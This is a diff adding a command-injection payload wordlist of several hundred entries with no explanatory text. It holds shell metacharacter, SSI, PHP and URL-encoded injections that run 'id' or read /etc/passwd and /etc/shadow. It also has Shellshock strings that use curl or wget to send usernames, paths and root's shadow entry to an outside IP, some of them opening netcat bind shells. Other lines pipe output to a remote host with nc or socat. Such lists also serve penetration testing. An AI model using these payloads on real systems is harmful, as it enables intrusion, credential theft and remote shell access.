@@ -1,0 +1,812 @@
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+/index.html|id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
+\n/bin/ls -al\n
+\n/usr/bin/id\n
+\nid\n
+\n/usr/bin/id;
+\nid;
+\n/usr/bin/id|
+\nid|
+;/usr/bin/id\n
+;id\n
+|usr/bin/id\n
+|nid\n
+`id`
+`/usr/bin/id`
+a);id
+a;id
+a);id;
+a;id;
+a);id|
+a;id|
+a)|id
+a|id
+a)|id;
+a|id
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+a)|/usr/bin/id
+a|/usr/bin/id
+a)|/usr/bin/id;
+a|/usr/bin/id
+;system('cat%20/etc/passwd')
+;system('id')
+;system('/usr/bin/id')
+%0Acat%20/etc/passwd
+%0A/usr/bin/id
+%0Aid
+%0A/usr/bin/id%0A
+%0Aid%0A
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+| id
+& id
+; id
+%0a id %0a
+`id`
+';"//%%*()("")}]]:("(';/usr/bin/id
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=18?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=22?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\`nc -lvvp 1234 -e /bin/bash\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=26?shell=\`nc -lvvp 1236 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=5"
+() { :;}; /bin/bash -c "sleep 1 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=1&?vuln=6"
+() { :;}; /bin/bash -c "sleep 1 && echo vulnerable 1"
+() { :;}; /bin/bash -c "sleep 3 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=3&?vuln=7"
+() { :;}; /bin/bash -c "sleep 3 && echo vulnerable 3"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=6&?vuln=8"
+() { :;}; /bin/bash -c "sleep 6 && curl http://135.23.158.130/.testing/shellshock.txt?sleep=9&?vuln=9"
+() { :;}; /bin/bash -c "sleep 6 && echo vulnerable 6"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\`whoami\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=19?pwd=\`pwd\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=21?shadow=\`grep root /etc/shadow\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=23?uname=\`uname -a\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=25?shell=\`nc -lvvp 1235 -e /bin/bash\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=27?shell=\`nc -lvvp 1237 -e /bin/bash &\`"
+() { :;}; /bin/bash -c "wget http://135.23.158.130/.testing/shellshock.txt?vuln=4"
+cat /etc/hosts
+';"//%%*()("")}]]:("('(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+<!--#exec cmd="/usr/bin/id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+id
+';"//%%*()("")}]]:("('(id)
+';"//%%*()("")}]]:("('(command /c id)
+';"//%%*()("")}]]:("('(eval id)
+';"//%%*()("")}]]:("('(echo id)
+';"//%%*()("")}]]:("('(bash -c id)
+';"//%%*()("")}]]:("('(sh -c id)
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import os; print(os.popen("id").read())')
+';"//%%*()("")}]]:("('(ruby -e 'puts %x(id)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout) => console.log(stdout))')
+';"//%%*()("")}]]:("('(php -r 'echo shell_exec("id");')
+';"//%%*()("")}]]:("('(curl -s http://localhost:8080?id)
+';"//%%*()("")}]]:("('(echo id | nc -v 10.0.0.1 1234)
+';"//%%*()("")}]]:("('(echo id | socat - TCP:10.0.0.1:1234)
+';"//%%*()("")}]]:("('(exec(id))
+';"//%%*()("")}]]:("('(eval(id))
+';"//%%*()("")}]]:("('(cmd /c id)
+';"//%%*()("")}]]:("('(powershell -Command "id")
+';"//%%*()("")}]]:("('(exec('id'))
+';"//%%*()("")}]]:("('(system("id"))
+';"//%%*()("")}]]:("('(system('id'))
+';"//%%*()("")}]]:("('(eval "id")
+';"//%%*()("")}]]:("('(echo id | nc 10.0.0.1 1234)
+';"//%%*()("")}]]:("('(bash -i -c id)
+';"//%%*()("")}]]:("('(sh -i -c id)
+';"//%%*()("")}]]:("('(perl -e 'exec("id")')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; print(subprocess.check_output("id", shell=True).decode())')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").execSync("id").toString()')
+';"//%%*()("")}]]:("('(php -r 'passthru("id");')
+';"//%%*()("")}]]:("('(ruby -e 'system("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; print(subprocess.check_output("id", shell=True).decode())')
+';"//%%*()("")}]]:("('(bash -c 'id')
+';"//%%*()("")}]]:("('(sh -c 'id')
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout) => { console.log(stdout) })')
+';"//%%*()("")}]]:("('(php -r 'exec("id");')
+';"//%%*()("")}]]:("('(curl -s 'http://10.0.0.1:8080?id')
+';"//%%*()("")}]]:("('(echo id | socat - TCP4:10.0.0.1:1234)
+';"//%%*()("")}]]:("('(bash -i -c 'id')
+';"//%%*()("")}]]:("('(sh -i -c 'id')
+';"//%%*()("")}]]:("('(perl -e 'system("id")')
+';"//%%*()("")}]]:("('(python -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout, stderr) => { if (err) { console.error(stderr); return; } console.log(stdout); })')
+';"//%%*()("")}]]:("('(php -r 'passthru("id");')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(bash -c 'id')
+';"//%%*()("")}]]:("('(sh -c 'id')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(php -r 'exec("id");')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; print(subprocess.check_output("id", shell=True).decode())')
+';"//%%*()("")}]]:("('(python -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(bash -i -c 'id')
+';"//%%*()("")}]]:("('(sh -i -c 'id')
+';"//%%*()("")}]]:("('(perl -e 'system("id")')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.run("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").execSync("id").toString()')
+';"//%%*()("")}]]:("('(php -r 'shell_exec("id")')
+';"//%%*()("")}]]:("('(ruby -e 'system("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(python -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(bash -i -c 'id')
+';"//%%*()("")}]]:("('(sh -i -c 'id')
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.check_call("id", shell=True)')
+';"//%%*()("")}]]:("('(php -r 'system("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(python3 -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(bash -c 'id')
+';"//%%*()("")}]]:("('(sh -c 'id')
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.run("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout, stderr) => { if (err) { console.error(stderr); return; } console.log(stdout); })')
+';"//%%*()("")}]]:("('(php -r 'system("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(perl -e 'system("id")')
+';"//%%*()("")}]]:("('(bash -i -c 'id')
+';"//%%*()("")}]]:("('(sh -i -c 'id')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.check_call("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").execSync("id").toString()')
+';"//%%*()("")}]]:("('(php -r 'shell_exec("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.run("id", shell=True)')
+';"//%%*()("")}]]:("('(python3 -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(bash -c 'id')
+';"//%%*()("")}]]:("('(sh -c 'id')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.check_call("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout, stderr) => { if (err) { console.error(stderr); return; } console.log(stdout); })')
+';"//%%*()("")}]]:("('(php -r 'system("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.call("id", shell=True)')
+
+';"//%%*()("")}]]:("('(id)
+';"//%%*()("")}]]:("('(bash -c "id")
+';"//%%*()("")}]]:("('(sh -c "id")
+';"//%%*()("")}]]:("('(perl -e 'exec("id")')
+';"//%%*()("")}]]:("('(python -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").execSync("id").toString()')
+';"//%%*()("")}]]:("('(php -r 'exec("id")')
+';"//%%*()("")}]]:("('(ruby -e 'system("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(perl -e 'system("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout) => console.log(stdout))')
+';"//%%*()("")}]]:("('(php -r 'passthru("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(curl -s "http://localhost:8080?id")
+';"//%%*()("")}]]:("('(bash -i -c "id")
+';"//%%*()("")}]]:("('(sh -i -c "id")
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; print(subprocess.check_output("id", shell=True).decode())')
+';"//%%*()("")}]]:("('(php -r 'shell_exec("id")')
+';"//%%*()("")}]]:("('(ruby -e 'system("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.check_output("id", shell=True)')
+';"//%%*()("")}]]:("('(bash -i -c 'id')
+';"//%%*()("")}]]:("('(sh -i -c 'id')
+';"//%%*()("")}]]:("('(perl -e 'system("id")')
+';"//%%*()("")}]]:("('(python -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").execSync("id").toString()')
+';"//%%*()("")}]]:("('(php -r 'system("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(curl -s "http://10.0.0.1:8080?id")
+';"//%%*()("")}]]:("('(bash -c "id")
+';"//%%*()("")}]]:("('(sh -c "id")
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout) => console.log(stdout))')
+';"//%%*()("")}]]:("('(php -r 'exec("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import os; os.system("id")')
+';"//%%*()("")}]]:("('(perl -e 'system("id")')
+';"//%%*()("")}]]:("('(bash -i -c "id")
+';"//%%*()("")}]]:("('(sh -i -c "id")
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.check_output("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout) => { if (!err) console.log(stdout) })')
+';"//%%*()("")}]]:("('(php -r 'passthru("id")')
+';"//%%*()("")}]]:("('(ruby -e 'system("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(bash -c 'id')
+';"//%%*()("")}]]:("('(sh -c 'id')
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").execSync("id").toString()')
+';"//%%*()("")}]]:("('(php -r 'system("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.check_call("id", shell=True)')
+';"//%%*()("")}]]:("('(curl -s "http://localhost:8080?id")
+';"//%%*()("")}]]:("('(bash -i -c 'id')
+';"//%%*()("")}]]:("('(sh -i -c 'id')
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.check_output("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout) => { if (!err) console.log(stdout) })')
+';"//%%*()("")}]]:("('(php -r 'passthru("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(bash -c "id")
+';"//%%*()("")}]]:("('(sh -c "id")
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").execSync("id").toString()')
+';"//%%*()("")}]]:("('(php -r 'system("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.check_call("id", shell=True)')
+';"//%%*()("")}]]:("('(curl -s "http://10.0.0.1:8080?id")
+';"//%%*()("")}]]:("('(bash -i -c "id")
+';"//%%*()("")}]]:("('(sh -i -c "id")
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.check_output("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout) => { if (!err) console.log(stdout) })')
+';"//%%*()("")}]]:("('(php -r 'passthru("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(bash -c "id")
+';"//%%*()("")}]]:("('(sh -c "id")
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").execSync("id").toString()')
+';"//%%*()("")}]]:("('(php -r 'system("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.check_call("id", shell=True)')
+';"//%%*()("")}]]:("('(curl -s "http://localhost:8080?id")
+';"//%%*()("")}]]:("('(bash -i -c "id")
+';"//%%*()("")}]]:("('(sh -i -c "id")
+';"//%%*()("")}]]:("('(perl -e 'print qx/id/;')
+';"//%%*()("")}]]:("('(python -c 'import subprocess; subprocess.check_output("id", shell=True)')
+';"//%%*()("")}]]:("('(node -e 'require("child_process").exec("id", (err, stdout) => { if (!err) console.log(stdout) })')
+';"//%%*()("")}]]:("('(php -r 'passthru("id")')
+';"//%%*()("")}]]:("('(ruby -e 'exec("id")')
+';"//%%*()("")}]]:("('(python3 -c 'import subprocess; subprocess.call("id", shell=True)')
+';"//%%*()("")}]]:("('(bash -c "id")
+';"//%%*()("")}]]:("('(sh -c "id")
+';"//%%*()("")}]]:("('(eval(id))
+';"//%%*()("")}]]:("('(id\x20\x3b\x20echo\x20hello)
+';"//%%*()("")}]]:("('(id\x20\x26\x20echo\x20hello)
+';"//%%*()("")}]]:("('(id\x20\x2f\x2a\x20\x2a\x2f\x20echo\x20hello)
+';"//%%*()("")}]]:("('(i\x64)
+';"//%%*()("")}]]:("('(bash\x20-c\x20"id")
+';"//%%*()("")}]]:("('(sh\x20-c\x20"id")
+';"//%%*()("")}]]:("('(p\x65rl\x20-e\x20'print\x20qx/id/;')
+';"//%%*()("")}]]:("('(python\x20-c\x20'import\x20os;os.system("id")')
+';"//%%*()("")}]]:("('(python3\x20-c\x20'import\x20subprocess;subprocess.check_output("id",\x20shell=True).decode()')
+';"//%%*()("")}]]:("('(php\x20-r\x20'system("id")')
+';"//%%*()("")}]]:("('(ruby\x20-e\x20'exec("id")')
+';"//%%*()("")}]]:("('(node\x20-e\x20'require("child_process").execSync("id").toString()')
+';"//%%*()("")}]]:("('(node\x20-e\x20'require("child_process").exec("id",\x20(err,\x20stdout)\x20=>\x20console.log(stdout))')
+';"//%%*()("")}]]:("('(python\x20-c\x20'import\x20subprocess;subprocess.call("id",\x20shell=True)')
+';"//%%*()("")}]]:("('(id\x20;echo\x20hello)
+';"//%%*()("")}]]:("('(i\x64\x20;echo\x20hello)
+';"//%%*()("")}]]:("('(p\x65rl\x20-e\x20'system("id")')
+';"//%%*()("")}]]:("('(sh\x20-c\x20'id')
+';"//%%*()("")}]]:("('(bash\x20-i\x20-c\x20'id')
+';"//%%*()("")}]]:("('(eval\x20id\x20//\x2f)
+';"//%%*()("")}]]:("('(python\x20-c\x20'import\x20subprocess;print(subprocess.call("id",\x20shell=True))')
+';"//%%*()("")}]]:("('(node\x20-e\x20'require("child_process").exec("id",\x20(err,\x20stdout)\x20=>\x20{if\x20(!err)\x20console.log(stdout)})')
+';"//%%*()("")}]]:("('(curl\x20-s\x20"http://localhost:8080?id")
+';"//%%*()("")}]]:("('(bash\x20-c\x20"id"\x20\x26\x20echo\x20"hello")
+';"//%%*()("")}]]:("('(i\x64\x20\x26\x20echo\x20"hello")
+';"//%%*()("")}]]:("('(python3\x20-c\x20'import\x20subprocess;subprocess.check_call("id",\x20shell=True)')
+';"//%%*()("")}]]:("('(php\x20-r\x20'passthru("id")')
+';"//%%*()("")}]]:("('(eval\x20id\x20\x7c\x20grep\x20foo)
+';"//%%*()("")}]]:("('(perl\x20-e\x20'system("id")\x20\x26\x20echo\x20hello')
+; id
+| id
+&& id
+|| id
+; (id)
+| (id)
+&& (id)
+|| (id)
+$(id)
+`id`
+; $(echo id)
+; $(printf id)
+; $(perl -e 'exec "id"')
+; $(python3 -c 'import os; os.system("id")')
+; $(ruby -e 'exec "id"')
+; $(php -r 'system("id")')
+; $(bash -c 'id')
+; $(sh -c 'id')
+; /bin/sh -c 'id'
+; /bin/bash -c 'id'
+%3B id
+%7C id
+%26 id
+%7C%7C id
+%3B%20id
+%26%26 id
+%28 id %29
+%60id%60
+\u003B id
+\u007C id
+; id;
+; /usr/bin/id
+; /usr/local/bin/id
+; /sbin/id
+; /bin/id
+; /usr/sbin/id
+; $(which id)
+; $(command -v id)
+; $(whereis id)
+; $(type -p id)
+; { id; }
+; (id)
+; id | tee /dev/null
+; id > /tmp/id_result
+; exec id
+; id &
+; id 2>&1
+; id > /dev/null
+; id | cat
+; id; true
+%3B%20id%29
+%3B%20id%3B
+%3B%20%22id%22
+%3B%20%27id%27
+%3B%20id%20%7C
+%3B%20id%20%26
+%3B%20id%20%3E
+%3B%20id%20%3E%3E
+%3B%20id%202%3E%261
+%3B%20%28id%29%20%7C
+%3B%20%28id%29%20%26
+%3B%20%2Fbin%2Fsh%20-c%20%27id%27
+%3B%20%2Fbin%2Fbash%20-c%20%27id%27
+%3B%20%24%28id%29
+%3B%20%60id%60
+%3B%20%24%28echo%20id%29
+%3B%20%24%28env%20id%29
+%3B%20id%20%5C%3B
+%3B%20id%20%5C%7C
+%3B%20id%20%5C%26
+%3B%20id%20%5C%3E
+%3B%20id%20%5C%3E%3E
+%3B%20id%20%5C2%3E%261
+%3B%20id%20%5C%7C%20tee%20%2Fdev%2Fnull
+%3B%20%2Fusr%2Fbin%2Fenv%20bash%20-c%20%27id%27
+%3B%20%2Fusr%2Flocal%2Fbin%2Fbash%20-c%20%27id%27
+%3B%20%2Fsbin%2Fsh%20-c%20%27id%27
+%3B%20%2Fbin%2Fsh%20-c%20%27id%20%7C%20cat%27
+%3B%20%2Fbin%2Fbash%20-c%20%27id%20%7C%20tee%20%2Fdev%2Fnull%27
+%3B%20%24%28echo%20id%20%7C%20tee%20%2Fdev%2Ftty%29
+%3B%20%24%28echo%20id%20%7C%20base64%20--decode%29
+%3B%20%24%28echo%20%22aWQ%3D%22%20%7C%20base64%20--decode%29
+%3B%20%24%28echo%20id%20%7C%20base64%20%7C%20base64%20--decode%29
+%3B%20%24%28sh%20-c%20%27id%27%29
+%3B%20%24%28bash%20-i%20-c%20%27id%27%29
+%3B%20%24%28python%20-c%20%27import%20os%3B%20os.system%28%22id%22%29%27%29
+%3B%20%24%28perl%20-e%20%27exec%20%22id%22%27%29
+%3B%20%24%28ruby%20-e%20%27exec%20%22id%22%27%29
+%3B%20%24%28php%20-r%20%27system%28%22id%22%29%27%29
+%3B%20%24%28awk%20%27BEGIN%20%7B%20system%28%22id%22%29%20%7D%27%29
+%3B%20%24%28find%20%2F%20-name%20id%20-exec%20id%20%5C%3B%29
+%3B%20%24%28type%20-p%20id%29
+%3B%20%24%28which%20id%29
+%3B%20%24%28command%20-v%20id%29
+%3B%20%24%28whereis%20id%29
+%3B%20%24%28ps%20aux%20%7C%20grep%20id%29
+%3B%20%24%28awk%20%27%7Bprint%20%24%30%20%7C%20%22id%22%7D%27%29
+%3B%20%24%28echo%20%2D%65%20id%29
+%3B%20%24%28echo%20id%20%7C%20xargs%29
+%3B%20%24%28perl%20-e%20%27system%28%22id%22%29%27%29
+; id)
+; id |
+; id &
+; id >
+; id >>
+; id 2>&1
+; id | tee /dev/null
+; id \|
+; id \&
+; id \>
+; id \>>
+; id \2>&1
+; id \;
+; id \)
+; id \}
+; id \{
+; id \; echo done
+; id \| echo done
+; id \& echo done
+; id \> echo done
+; id \>> echo done
+; id \2>&1 echo done
+; id \| /bin/sh -c 'echo done'
+; id \| /bin/bash -c 'echo done'
+; id \; /bin/sh -c 'echo done'
+; id \; /bin/bash -c 'echo done'
+; id | /bin/bash -c 'id'
+; id; /usr/bin/env bash -c 'id'
+; id; /usr/local/bin/bash -c 'id'
+; id; /sbin/sh -c 'id'
+; id; (id)
+; id; $(id)
+; id; \id``
+; id; $(echo id)
+; id; $(env id)
+; id; $(command id)
+; id; $(busybox id)
+; id; $(/bin/sh -c 'id')
+; id; $(bash -c 'id')
+; id; $(perl -e 'system("id")')
+; id; $(python -c 'import os; os.system("id")')
+; id; $(ruby -e 'exec "id"')
+; id; $(php -r 'system("id")')
+; id; $(awk 'BEGIN { system("id") }')
+; id; $(find / -name id -exec id \;)
+; id; $(type -p id)
+; id; $(which id)
+; id; $(command -v id)
+; id; $(whereis id)
+; id; $(ps aux | grep id)
+%3B%20id%29
+%3B%20id%20%7C
+%3B%20id%20%26
+%3B%20id%20%3E
+%3B%20id%20%3E%3E
+%3B%20id%202%3E%261
+%3B%20id%20%7C%20tee%20%2Fdev%2Fnull
+%3B%20id%20%5C%7C
+%3B%20id%20%5C%26
+%3B%20id%20%5C%3E
+%3B%20id%20%5C%3E%3E
+%3B%20id%20%5C2%3E%261
+%3B%20id%20%5C%3B
+%3B%20id%20%5C%29
+%3B%20id%20%5C%7D
+%3B%20id%20%5C%7B
+%3B%20id%20%5C%3B%20echo%20done
+%3B%20id%20%5C%7C%20echo%20done
+%3B%20id%20%5C%26%20echo%20done
+%3B%20id%20%5C%3E%20echo%20done
+%3B%20id%20%5C%3E%3E%20echo%20done
+%3B%20id%20%5C2%3E%261%20echo%20done
+%3B%20id%20%5C%7C%20%2Fbin%2Fsh%20-c%20%27echo%20done%27
+%3B%20id%20%5C%7C%20%2Fbin%2Fbash%20-c%20%27echo%20done%27
+%3B%20id%20%5C%3B%20%2Fbin%2Fsh%20-c%20%27echo%20done%27
+%3B%20id%20%5C%3B%20%2Fbin%2Fbash%20-c%20%27echo%20done%27
+%3B%20id%20%7C%20%2Fbin%2Fbash%20-c%20%27id%27
+%3B%20id%3B%20%2Fusr%2Fbin%2Fenv%20bash%20-c%20%27id%27
+%3B%20id%3B%20%2Fusr%2Flocal%2Fbin%2Fbash%20-c%20%27id%27
+%3B%20id%3B%20%2Fsbin%2Fsh%20-c%20%27id%27
+%3B%20id%3B%20%28id%29
+%3B%20id%3B%20%24%28id%29
+%3B%20id%3B%20%60id%60
+%3B%20id%3B%20%24%28echo%20id%29
+%3B%20id%3B%20%24%28env%20id%29
+%3B%20id%3B%20%24%28command%20id%29
+%3B%20id%3B%20%24%28busybox%20id%29
+%3B%20id%3B%20%24%28%2Fbin%2Fsh%20-c%20%27id%27%29
+%3B%20id%3B%20%24%28bash%20-c%20%27id%27%29
+%3B%20id%3B%20%24%28perl%20-e%20%27system%28%22id%22%29%27%29
+%3B%20id%3B%20%24%28python%20-c%20%27import%20os%3B%20os.system%28%22id%22%29%27%29
+%3B%20id%3B%20%24%28ruby%20-e%20%27exec%20%22id%22%27%29
+%3B%20id%3B%20%24%28php%20-r%20%27system%28%22id%22%29%27%29
+%3B%20id%3B%20%24%28awk%20%27BEGIN%20%7B%20system%28%22id%22%29%20%7D%27%29
+%3B%20id%3B%20%24%28find%20%2F%20-name%20id%20-exec%20id%20%5C%3B%29
+%3B%20id%3B%20%24%28type%20-p%20id%29
+%3B%20id%3B%20%24%28which%20id%29
+%3B%20id%3B%20%24%28command%20-v%20id%29
+%3B%20id%3B%20%24%28whereis%20id%29
+%3B%20id%3B%20%24%28ps%20aux%20%7C%20grep%20id%29
+; echo "test" | id
+; echo "test" & id
+; echo "test" ; id
+; (echo "test") | id
+; { echo "test"; } | id
+; echo "test" > /dev/null; id
+; echo "test" 2>&1; id
+; echo "test" >> /dev/null; id
+; echo "test" & echo "done"; id
+; echo "test" ; id
+; echo "test" \| id
+; echo "test" \& id
+; echo "test" \> id
+; echo "test" \>> id
+; echo "test" \2>&1; id
+; echo "test" \; id
+; echo "test" \) id
+; echo "test" \{ id
+; echo "test" \| /bin/sh -c 'id'
+; echo "test" \& /bin/bash -c 'id
+; "''()&&id"
+; '""()&&id'
+; ()&&id
+; ")(id)
+; ')(id)'
+; \id``
+; echo "test" && id
+; echo "test" || id
+; (id) || echo "done"
+; (id) && echo "done"
+; id; echo "done"
+; id | echo "done"
+; id > /dev/null
+; id 2>&1
+; id; echo "done" > /dev/null
+; id && echo "done"
+; id || echo "done"
+; id \| echo "done"
+; id \& echo "done"
+; id \> /dev/null
+; "id" |
+; 'id' \|
+; id && echo "done"
+; id \& echo "done"
+; id \| echo "done"
+; id \> /dev/null
+; id 2\>\&1
+; id \&\& echo "done"
+; id \|\| echo "done"
+; (id) |
+; (id) \|
+; \id``
+; \$(id)
+; \$(id) && echo "done"
+; \$(id) \&\& echo "done"
+; \$(id) \|\| echo "done"
+; \$(echo test) && id
+; \$(echo test) \&\& id
+; \$(echo test) \|\| id
+; \$(echo test) \> /dev/null \&\& id
+; $(id) |
+; (id) |
+; id \&\& echo "done"
+; id \|\| echo "done"
+; \$(id) \&\& echo "done"
+; \$(id) \|\| echo "done"
+; id \&\& \echo done``
+; \id` && echo "done"`
+; \$(id) \&\& \echo done``
+; id \&\& echo "done" \| tee /dev/null
+; \id` | tee /dev/null`
